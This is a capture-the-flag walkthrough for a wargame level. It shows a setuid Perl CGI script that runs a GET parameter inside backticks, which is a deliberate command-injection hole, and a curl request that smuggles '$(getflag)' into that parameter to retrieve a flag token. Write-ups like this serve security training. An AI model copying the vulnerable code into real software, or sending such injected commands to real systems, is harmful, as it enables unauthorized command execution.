## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2004(level04) gid=2004(level04) groups=2004(level04),100(users)
```

This shows that we are operating as the user `level04`.

---

## Step 2: Searching for Files

Next, let's check what files are in our `/home` directory:

```bash
$ ls -la
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

$ file level04.pl
level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
```
We find perl script owned by `flag04` with read and executable permissions for our user. 

---

## Step 3: Read the source code

```bash
$ bat level04.pl
```

```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
This script uses CGI, which means that by connecting to the machine's IP address and specified port, we can interact with it. The script executes the first parameter received from a GET request with elevated privileges.

---

## Step 4: Exploiting the Binary to Get a  SubShell

To get a subshell, we can send a GET request to the script with the appropriate parameters. Here is how you can do it:
```bash
$ curl 192.168.234.77:4747?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
---

And there you have it, the token is `ne2searoevaevoem4ov4ar8ap`.
